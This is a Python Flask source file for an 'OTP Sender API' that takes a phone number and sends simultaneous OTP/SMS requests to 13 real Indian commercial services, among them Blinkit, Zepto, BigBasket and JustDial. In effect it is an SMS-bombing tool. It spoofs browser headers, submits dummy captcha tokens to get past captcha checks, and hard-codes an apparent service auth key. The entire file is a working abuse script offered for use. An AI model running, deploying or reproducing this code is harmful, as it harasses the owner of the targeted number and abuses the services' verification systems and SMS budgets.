from flask import Flask, request, jsonify
import requests
import json
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=13)

@app.after_request
def add_cors(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route('/')
def home():
    return jsonify({
        "service": "OTP Sender API",
        "usage": "/send?num=9876543210",
        "total_apis": 13,
        "credit": "@BRONX_ULTRA"
    })

# ============ 13 OTP APIs — EXACT HEADERS FROM ORIGINAL SCRIPTS ============

def api_1_oneplay(phone):
    try:
        url = "https://rendermix.oneplay.in/v3/accounts/get_login_otp"
        payload = {"phone": f"+91{phone}", "device": "web", "idempotent_key": str(uuid.uuid4()), "referral_code": ""}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'sec-ch-ua-mobile': "?1",
            'x-partner-id': "28cceed5-8ab9-11ed-bde5-0ab3c1edb81a",
            'x-lang': "en",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.5",
            'origin': "https://www.oneplay.in",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.oneplay.in/",
            'priority': "u=1, i"
        }
        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        return "oneplay", r.status_code
    except: return "oneplay", "FAIL"

def api_2_district(phone):
    try:
        url = "https://www.district.in/gw/auth/generate_otp"
        payload = {"phone_number": phone, "country_code": "91"}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'x-device-id': str(uuid.uuid4()),
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'x-app-type': "ed_web",
            'sec-ch-ua-mobile': "?1",
            'x-guest-token': "1212",
            'x-app-version': "11.11.1",
            'x-client-id': "district-web",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.5",
            'origin': "https://www.district.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.district.in/",
            'priority': "u=1, i"
        }
        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        return "district", r.status_code
    except: return "district", "FAIL"

def api_3_prideofcows(phone):
    try:
        url = "https://prideofcows.com/prideofcows/api/customer/login"
        payload = {"MobileNo": phone, "Source": "Desktop", "Type": "signup"}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'sec-ch-ua-mobile': "?1",
            'Sec-GPC': "1",
            'Accept-Language': "en-US,en;q=0.7",
            'Origin': "https://prideofcows.com",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://prideofcows.com/poc/login"
        }
        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        return "prideofcows", r.status_code
    except: return "prideofcows", "FAIL"

def api_4_pw(phone):
    try:
        url = "https://api.penpencil.co/v1/users/register-secure/5eb393ee95fab7468a79d189"
        params = {'smsType': "0"}
        payload = {"mobile": phone, "countryCode": "+91", "firstName": "User", "subOrgId": "SUB-PWLI000", "captchaToken": "1", "captchaSiteKey": "1"}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'randomid': str(uuid.uuid4()),
            'x-sdk-version': "0.0.27",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'sec-ch-ua-mobile': "?1",
            'client-type': "WEB",
            'client-id': "5eb393ee95fab7468a79d189",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.5",
            'origin': "https://www.pw.live",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.pw.live/",
            'priority': "u=1, i"
        }
        r = requests.post(url, params=params, data=json.dumps(payload), headers=headers, timeout=10)
        return "pw", r.status_code
    except: return "pw", "FAIL"

def api_5_shopflo(phone):
    try:
        url = "https://api.shopflo.co/heimdall/api/v1/otp/send"
        payload = {"oid": f"+91{phone}", "merchant_id": "7e84e5aa-092f-4a3d-b61e-34dbfa801c69", "context": "SSO", "sso_request_id": str(uuid.uuid4()), "captcha_token": "1", "captcha_provider": "ALTCHA"}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'sec-ch-ua-mobile': "?1",
            'x-shopflo-version': "stable",
            'x-shopflo-session': f"am_{uuid.uuid4().hex[:16]}",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.9",
            'origin': "https://checkout.shopflo.co",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://checkout.shopflo.co/",
            'priority': "u=1, i"
        }
        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        return "shopflo", r.status_code
    except: return "shopflo", "FAIL"

def api_6_provilac(phone):
    try:
        url = "https://pune.provilac.com/restapi/customer/sendOTP/v2"
        params = {'mobileNumber': phone, 'cityName': "Pune", 'resendOtp': "false"}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'content-length': "0",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://provilac.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://provilac.com/",
            'priority': "u=1, i"
        }
        r = requests.post(url, params=params, headers=headers, timeout=10)
        return "provilac", r.status_code
    except: return "provilac", "FAIL"

def api_7_blinkit(phone):
    try:
        url = "https://blinkit.com/v2/accounts/"
        payload = {'user_phone': phone}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': "\"Android\"",
            'lat': "28.4465616",
            'session_uuid': str(uuid.uuid4()),
            'web_app_version': "1008010016",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'sec-ch-ua-mobile': "?1",
            'app_version': "52434332",
            'rn_bundle_version': "1009003012",
            'app_client': "consumer_web",
            'device_id': uuid.uuid4().hex[:16],
            'auth_key': "c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477",
            'lon': "77.040489",
            'platform': "mobile_web",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.5",
            'origin': "https://blinkit.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://blinkit.com/",
            'priority': "u=1, i"
        }
        r = requests.post(url, data=payload, headers=headers, timeout=10)
        return "blinkit", r.status_code
    except: return "blinkit", "FAIL"

def api_8_gokwik(phone):
    try:
        url = "https://gkx.gokwik.co/v4/auth/otp/login/trigger"
        payload = {"phone": phone, "country": "IN"}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'gk-version': "20260730163623787",
            'gk-timestamp': str(int(time.time()*1000)),
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'gk-udf-1': "8684",
            'sec-ch-ua-mobile': "?1",
            'gk-platform': "shopify",
            'gk-request-id': str(uuid.uuid4()),
            'gk-source': "kp",
            'gk-merchant-id': "1rb3imhyis8gv",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.5",
            'origin': "https://pdp.gokwik.co",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://pdp.gokwik.co/",
            'priority': "u=1, i"
        }
        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        return "gokwik", r.status_code
    except: return "gokwik", "FAIL"

def api_9_milkymist(phone):
    try:
        url = "https://api.rodeodigital.com/identity/api/v1/auth/challenge"
        params = {'ts': str(int(time.time()*1000))}
        payload = {"mobile": phone, "appCode": "milkymisted", "challengeType": "SMS-OTP"}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'browser-fingerprint': uuid.uuid4().hex[:32],
            'sec-ch-ua-platform': "\"Android\"",
            'accept-language': "en",
            'store-loc-id': "855",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'sec-ch-ua-mobile': "?1",
            'ecom-platform': "web",
            'store-id': "600",
            'device-id': str(uuid.uuid4()),
            'app-code': "milkymisted",
            'delivery-area-id': "19774",
            'sec-gpc': "1",
            'origin': "https://shop.milkymist.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://shop.milkymist.com/",
            'priority': "u=1, i"
        }
        r = requests.post(url, params=params, data=json.dumps(payload), headers=headers, timeout=10)
        return "milkymist", r.status_code
    except: return "milkymist", "FAIL"

def api_10_bigbasket(phone):
    try:
        url = "https://www.bigbasket.com/member-tdl/v3/member/otp"
        payload = {"identifier": phone, "referrer": "unified_login", "recaptchaToken": "1"}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'x-caller': "Monster-SVC",
            'referring-client': "https://www.bigbasket.com",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'sec-ch-ua-mobile': "?1",
            'x-entry-context': "bbnow",
            'x-entry-context-id': "10",
            'x-channel': "BB-PWA",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://www.bigbasket.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'priority': "u=1, i"
        }
        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        return "bigbasket", r.status_code
    except: return "bigbasket", "FAIL"

def api_11_zepto(phone):
    try:
        url = "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/"
        payload = {"mobileNumber": phone, "countryCode": "+91"}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'bundleversion': "v1",
            'sec-ch-ua-mobile': "?1",
            'session_id': str(uuid.uuid4()),
            'content-type': "application/json; charset=UTF-8",
            'platform': "WEB",
            'sec-ch-ua-platform': "\"Android\"",
            'request_id': str(uuid.uuid4()),
            'deviceid': str(uuid.uuid4()),
            'appversion': "16.23.2",
            'device_id': str(uuid.uuid4()),
            'sessionid': str(uuid.uuid4()),
            'tenant': "ZEPTO",
            'app_version': "16.23.2",
            'source': "DIRECT",
            'app_sub_platform': "WEB",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://www.zepto.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.zepto.com/",
            'priority': "u=1, i"
        }
        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        return "zepto", r.status_code
    except: return "zepto", "FAIL"

def api_12_justdial(phone):
    try:
        url = "https://www.justdial.com/api/india_api_write/20march2020/sendvcode.php"
        params = {'wap': "2", 'resend': "0", 'randtime': str(int(time.time()*1000)), 'source': "2", 'version': "6.7", 'env': "p"}
        payload = {"mobile": phone, "fname": ""}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.7",
            'origin': "https://www.justdial.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.justdial.com/login",
            'priority': "u=1, i"
        }
        r = requests.post(url, params=params, data=json.dumps(payload), headers=headers, timeout=10)
        return "justdial", r.status_code
    except: return "justdial", "FAIL"

def api_13_hyperpure(phone):
    try:
        url = f"https://www.bigbasket.com/api/user/otpsms?isForgotPassword=true&userPhoneNumber={phone}&source=sign_in"
        payload = {"isForgotPassword": True, "userPhoneNumber": phone}
        headers = {
            'Host': "api.hyperpure.com",
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Brave\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
            'headerroute': "v2",
            'sec-ch-ua-mobile': "?1",
            'deviceid': f"{uuid.uuid4().hex[:8]}_uuid",
            'apptype': "mweb",
            'x-appmode': "STANDARD",
            'x-client': "consumer",
            'devicename': "Linux_Chrome",
            'x-trackingid': str(uuid.uuid4()),
            'apiversion': "12.1",
            'x-clientplatform': "mweb",
            'x-outletid': "0",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://www.hyperpure.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.hyperpure.com/",
            'priority': "u=1, i"
        }
        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        return "hyperpure", r.status_code
    except: return "hyperpure", "FAIL"

# ============ MAIN ENDPOINT ============
@app.route('/send')
def send_otp():
    phone = request.args.get('num', '').strip()
    
    if not phone or not phone.isdigit() or len(phone) < 10:
        return jsonify({"error": "Valid 10-digit number required", "usage": "/send?num=9876543210"}), 400
    
    start = time.time()
    
    apis = [api_1_oneplay, api_2_district, api_3_prideofcows, api_4_pw, api_5_shopflo,
            api_6_provilac, api_7_blinkit, api_8_gokwik, api_9_milkymist, api_10_bigbasket,
            api_11_zepto, api_12_justdial, api_13_hyperpure]
    
    futures = {executor.submit(api, phone): api.__name__ for api in apis}
    
    results = {}
    success = 0
    failed = 0
    
    for f in as_completed(futures):
        name = futures[f]
        try:
            api_name, status = f.result(timeout=15)
            results[api_name] = "✅ SENT" if status in [200, 201] else f"⚠️ {status}"
            if status in [200, 201]: success += 1
            else: failed += 1
        except:
            results[name] = "❌ TIMEOUT"
            failed += 1
    
    rt = round(time.time() - start, 2)
    
    return jsonify({
        "status": "completed",
        "number": phone,
        "response_time_seconds": rt,
        "total_apis": 13,
        "sent": success,
        "failed": failed,
        "details": results,
        "credit": "@BRONX_ULTRA"
    })

@app.route('/health')
def health():
    return jsonify({"status": "online"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 3000))
    app.run(host='0.0.0.0', port=port)
